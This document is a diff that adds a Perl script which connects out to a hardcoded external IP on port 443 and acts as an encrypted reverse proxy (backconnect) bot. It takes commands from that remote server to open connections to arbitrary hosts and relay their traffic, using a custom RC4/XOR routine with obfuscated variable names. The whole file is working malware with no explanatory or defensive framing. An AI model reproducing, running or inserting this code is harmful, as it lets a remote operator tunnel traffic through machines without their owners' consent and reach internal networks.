@@ -1,0 +1,539 @@
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+use Socket;
+use Socket qw(IPPROTO_TCP TCP_NODELAY);
+use Fcntl;
+use Fcntl qw(:flock);
+use threads;
+use threads::shared;
+
+my $host = '62.60.131.186';
+my $port = 443;
+
+my $xordata = "\x00" x 50;
+
+for (my $i = 0; $i < 50; $i++) { substr($xordata, $i, 1) = pack('C', rand(255)); }
+
+sub Rc4_crypt {
+	 
+	 my $passw = shift(@_);
+	 
+	 my $length = shift(@_);
+	 
+	 my $buff0 = shift(@_);
+	 
+	 my $start = shift(@_);
+	 
+	 my $sz = shift(@_);
+	 
+	 my $rc4 = "\x00" x 256;
+	 
+	 my $pockemon0 = 0;
+	
+	 my $pockemon1 = 0;
+	
+	 my $pockemon2 = 0;
+	
+	 my $pockemon3 = 0;
+	
+	 my $pockemon4 = 0;
+	
+	 my $pockemon5 = 0;
+	
+	 my $pockemon6 = 0;
+	
+	 my $pockemon7 = 0;
+	
+	 my $pockemon8 = 0;
+	 
+	 my $rcx = $sz;
+	 
+	 my $rsi = 0;
+	 
+	 my $rbx = 0;
+	 
+	 my $gs = 0;
+	 
+	 my $t = 0;
+	 
+	 for (my $i = 0; $i <= 255; $i++) { substr($rc4, $i, 1) = pack('C', $i); }
+	 
+	 do {
+		 
+		 substr($$buff0, $start + $rsi, 1) = pack('C', (unpack('C', substr($$buff0, $start + $rsi, 1)) ^ unpack('C', substr($$passw, $rbx, 1))));
+		 
+		 $rsi++;
+		
+		 $rbx++;
+		
+		 $rcx--;
+		
+		 if ($rbx == $length) {
+			 
+			 $rbx = 0;
+		}
+		 
+	} while($rcx > 0);
+	
+	
+	 while(1) {
+		 
+		 if ($gs == 0) {
+			 
+			 $pockemon2 = 0;
+
+			 $pockemon3 = $length;
+		}
+		 
+		 if ($gs != 0) {
+			 
+			 $gs = 0;
+
+			 $pockemon2++;
+
+			 if (--$pockemon3 == 0) { next; }
+			 
+		}
+		
+		 $pockemon7 = unpack('C', substr($rc4, $pockemon0, 1));
+		 
+		 $t = unpack('C', substr($$passw, $pockemon2, 1));
+
+		 $pockemon1 += $t;
+
+		 $pockemon1 = $pockemon1 & 255;
+
+		 $pockemon1 += $pockemon7;
+
+		 $pockemon1 = $pockemon1 & 255;
+
+		 $pockemon6 = unpack('C', substr($rc4, $pockemon1, 1));
+		 
+		 substr($rc4, $pockemon0, 1) = pack('C', $pockemon6);
+		 
+		 substr($rc4, $pockemon1, 1) = pack('C', $pockemon7);
+		 
+		 $pockemon0++;
+
+		 $pockemon0 = $pockemon0 & 255;
+		 
+		 if ($pockemon0 != 0) {
+			 
+			 $gs = 1;
+			 
+			 next;
+		}
+		
+		 $pockemon4 = $sz;
+
+		 $pockemon1 = 0;
+
+		 $pockemon0 = 0;
+
+		 $pockemon2 = 0;
+
+		 $pockemon3 = 0;
+		 
+		 while(1) {
+			 
+			 $pockemon2++;
+
+			 $pockemon2 = $pockemon2 & 255;
+
+			 $pockemon7 = unpack('C', substr($rc4, $pockemon2, 1));
+			 
+			 $pockemon1 += $pockemon7;
+
+			 $pockemon1 = $pockemon1 & 255;
+
+			 $pockemon8 = unpack('C', substr($rc4, $pockemon1, 1));
+
+			 substr($rc4, $pockemon2, 1) = pack('C', $pockemon8);
+		 
+			 substr($rc4, $pockemon1, 1) = pack('C', $pockemon7);
+
+			 $pockemon8 += $pockemon7;
+	
+			 $pockemon8 = $pockemon8 & 255;
+
+			 $pockemon0 = unpack('C', substr($rc4, $pockemon8, 1));
+			 
+			 $pockemon5 = unpack('C', substr($$buff0, $start + $pockemon3, 1));
+
+			 $pockemon5 = $pockemon5 ^ $pockemon0;
+			 
+			 substr($$buff0, $start + $pockemon3, 1) = pack('C', $pockemon5);
+			 
+			 $pockemon3++;
+			 
+			 if (--$pockemon4 == 0)
+			 {
+				 last;
+			 }
+			 
+		}
+		 
+		 last;
+	}
+	
+	 $rsi = 0;
+	
+	 $rcx = $sz;
+	
+	 $rbx = 0;
+	
+	 do {
+		 
+		 substr($$buff0, $start + $rsi, 1) = pack('C', (unpack('C', substr($$buff0, $start + $rsi, 1)) ^ unpack('C', substr($$passw, $rbx, 1))));
+		 
+		 $rsi++;
+		
+		 $rbx++;
+		
+		 $rcx--;
+		
+		 if ($rbx == $length) {
+			 
+			 $rbx = 0;
+		}
+		 
+	} while($rcx > 0);
+	
+}
+
+sub synsend {
+		
+	 my $cSocket = shift(@_);
+	 
+	 my $buffer = shift(@_);
+	 
+	 my $flags	= shift(@_);
+
+	 open(my $fh, "<", '/dev/null');
+
+	 flock($fh, LOCK_EX);
+	 
+	 # ===============================================
+	 
+	 send($cSocket, $buffer, $flags);
+	 
+	 # ===============================================
+	 
+	 flock($fh, LOCK_UN);
+
+	 close($fh);
+}
+
+sub newConnection {
+	
+	my $num = shift(@_);
+	
+	my $socketarray = shift(@_);
+	
+	my $sSocket = shift(@_);
+	
+	my $cSocket = shift(@_);
+	
+	my $buff0 = shift(@_);
+	
+    threads->create( sub {
+		
+		my $responce = pack('C', $num)."\x0A\x00\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00";
+		
+		my $domain = '';
+		
+		my $port = 0;
+		
+		my $_ret = 0;
+		
+		my $data = '';
+		
+		my $buffer = '';
+		
+		setsockopt($cSocket, IPPROTO_TCP, TCP_NODELAY, 1);
+		
+		fcntl($cSocket, F_SETFL, O_NONBLOCK);
+		
+		if (unpack('C', substr($buff0, 7, 1)) == 3) {
+			
+			$domain = substr($buff0, 9, unpack('C', substr($buff0, 8, 1)));
+			
+			$port = unpack('S', substr($buff0, 9 + unpack('C', substr($buff0, 8, 1)) + 1, 1).substr($buff0, 9 + unpack('C', substr($buff0, 8, 1)) + 0, 1));
+			
+		}
+		
+		elsif (unpack('C', substr($buff0, 7, 1)) == 1) {
+			
+			$domain = sprintf("%d.%d.%d.%d", unpack('C', substr($buff0, 8 + 0, 1)), unpack('C', substr($buff0, 8 + 1, 1)), unpack('C', substr($buff0, 8 + 2, 1)), unpack('C', substr($buff0, 8 + 3, 1)));
+			
+			$port = unpack('S', substr($buff0, 12 + 1, 1).substr($buff0, 12 + 0, 1));
+			
+		}
+		
+		else {
+			
+			 goto close_;
+		}
+		
+		 eval {
+			 
+			 my $paddr = sockaddr_in($port, inet_aton($domain));
+		
+			 connect($cSocket, $paddr);
+		 
+			 vec(my $win = '', fileno($cSocket), 1) = 1;
+
+			 unless (select(undef, $win, undef, 10)) { goto close_; }
+		 
+			 fcntl($cSocket, F_SETFL, 0);
+		 
+			 substr($responce, 4, 1) = "\x00";
+		 
+			 $_ret = 1;
+			 
+		 };
+		 
+		 close_:
+		 
+		 Rc4_crypt(\$xordata, 50, \$responce, 0, 3);
+		 
+		 Rc4_crypt(\$xordata, 50, \$responce, 3, 10);
+		 
+		 synsend($sSocket, $responce, MSG_NOSIGNAL);
+		 
+		 Rc4_crypt(\$xordata, 50, \$responce, 0, 3);
+		 
+		 if ($_ret == 1) {
+			 
+			 while ($$socketarray[$num] == 1) {
+				 
+				 vec(my $rin = '', fileno($cSocket), 1) = 1;
+				 
+				 unless (select($rin, undef, undef, 1)) { next; }
+				 
+				 $data = '';
+
+				 recv($cSocket, $data, 65530, 0);
+	 
+				 unless ($data) { last; }
+				 
+				 $buffer = pack('C', $num).pack('S', length($data)).$data;
+				 
+				 Rc4_crypt(\$xordata, 50, \$buffer, 0, 3);
+		 
+				 Rc4_crypt(\$xordata, 50, \$buffer, 3, length($data));
+				 
+				 synsend($sSocket, $buffer, MSG_NOSIGNAL);
+				 
+			}
+		}
+		
+		 $$socketarray[$num] = 0;
+		 
+		 close($cSocket);
+		 
+		 substr($responce, 1, 2) = "\x00\x00";
+		 
+		 Rc4_crypt(\$xordata, 50, \$responce, 0, 3);
+		 
+		 synsend($sSocket, substr($responce, 0, 3), MSG_NOSIGNAL);
+		
+         threads->detach();
+    });
+}
+
+sub bccnct {
+
+	 my $host = shift(@_);
+	 
+	 my $port = shift(@_);
+	 
+	 my $remaining = 0;
+	 
+	 my $remaining4 = 0;
+	 
+	 my @socketarr;
+	 
+	 my @socketarray :shared;
+	 
+	 my $buffer = "\x00" x 100;
+	 
+	 my $buffernull = "\x00" x 3;
+	 
+	 my $buffer0 = '';
+	 
+	 my $isExit = 0;
+	 
+	 my $ecx = 0;
+	 
+	 my $eax = 0;
+	 
+	 my $data = '';
+	 
+	 my $_ret = 0;
+	 
+	 my $ebx = 0;
+	 
+	 my $edx = 0;
+	 
+	 socket($socketarr[0], PF_INET, SOCK_STREAM, getprotobyname('tcp'));
+	 
+	 setsockopt($socketarr[0], IPPROTO_TCP, TCP_NODELAY, 1);
+	 
+	 my $paddr = sockaddr_in($$port, inet_aton($$host));
+	 
+	 unless(connect($socketarr[0], $paddr)) { goto close0; }
+	 
+	 substr($buffer, 0, 50) = $xordata;
+	 
+	 substr($buffer, 50, 2) = "\xFF\xFF";
+	 
+	 substr($buffer, 54, 11) = "Perl script";
+	 
+	 Rc4_crypt(\$xordata, 50, \$buffer, 50, 50);
+	 
+	 send($socketarr[0], $buffer, MSG_NOSIGNAL);
+	 
+	 while(1) {
+		 
+		 if ($remaining4 != 4) {
+			 
+			 vec(my $rin = '', fileno($socketarr[0]), 1) = 1;
+			 
+			 my $ret = select($rin, undef, undef, 60);
+			 
+			 next if ($ret < 0);
+			 
+			 if ($ret == 0) {
+				 
+				 last if (substr($buffernull, 0, 3) ne "\x00\x00\x00");
+				 
+				 last if ($remaining != 0);
+				 
+				 last if ($remaining4 != 0);
+				 
+				 Rc4_crypt(\$xordata, 50, \$buffernull, 0, 3);
+				 
+				 synsend($socketarr[0], $buffernull, MSG_NOSIGNAL);
+				 
+				 next;
+			}
+			 
+		}
+		 
+		 if ($remaining != 0 || $remaining4 == 4) {
+			 
+			 if ($edx == 0) {
+				 
+				 if (substr($buffer0, 0, 1) eq "\xFF" && substr($buffer0, 1, 1) eq "\xFE") {
+					 
+					 $isExit = 1;
+					 
+					 last;
+					 
+				}
+				 
+				 elsif ($ebx < 200 && $ebx > 0) {
+				 
+					 $socketarray[$ebx] = 0;
+				 
+				}
+			
+			}
+			
+			else {
+				
+				 $ecx = $edx;
+				
+				 $ecx = $ecx - $remaining;
+				 
+				 $data = '';
+				 
+				 recv($socketarr[0], $data, $ecx, 0);
+				
+				 unless ($data) { last; }
+				 
+				 $remaining += length($data);
+				 
+				 $buffer0 .= $data;
+				 
+				 if ($edx == $remaining) {
+					 
+					 Rc4_crypt(\$xordata, 50, \$buffer0, 4, $remaining);
+					 
+					 if (unpack('C', substr($buffer0, 0, 1)) == 0) {
+						 
+						 socket($socketarr[$ebx], PF_INET, SOCK_STREAM, getprotobyname('tcp'));
+						 
+						 $socketarray[$ebx] = 1;
+						 
+						 newConnection($ebx, \@socketarray, $socketarr[0], $socketarr[$ebx], $buffer0);
+						 
+					}
+					
+					 else {
+						 
+						 send($socketarr[$ebx], substr($buffer0, 4, $remaining), MSG_NOSIGNAL);
+						 
+					}
+					 
+					 $remaining = 0;
+				}
+				
+			}
+			 
+			 $remaining4 = 0;
+			 
+		}
+		
+		else {
+			
+			 if ($remaining4 == 0) { $buffer0 = ''; }
+			
+			 $eax = 4;
+			
+			 $eax = $eax - $remaining4;
+			 
+			 $data = '';
+			 
+			 recv($socketarr[0], $data, $eax, 0);
+			 
+			 unless ($data) { last; }
+			 
+			 $remaining4 += length($data);
+			 
+			 $buffer0 .= $data;
+			 
+			 $buffernull = "\x00" x 3;
+			 
+			 if ($remaining4 == 4) {
+				 
+				 Rc4_crypt(\$xordata, 50, \$buffer0, 0, 4);
+				 
+				 $ebx = unpack('C', substr($buffer0, 1, 1));
+				 
+				 $edx = unpack('S', substr($buffer0, 2, 2));
+			 
+				 $_ret = 1;
+			}
+			
+		}
+	}
+	
+	 close0:
+	 
+	 close($socketarr[0]);
+	 
+	 for (my $i = 0; $i < 200; $i++) { $socketarray[$i] = 0; }
+	 
+	 sleep 10;
+	 
+	 if ($isExit == 1) { exit; }
+	 
+	 return $_ret;
+
+}
+
+bccnct(\$host, \$port);
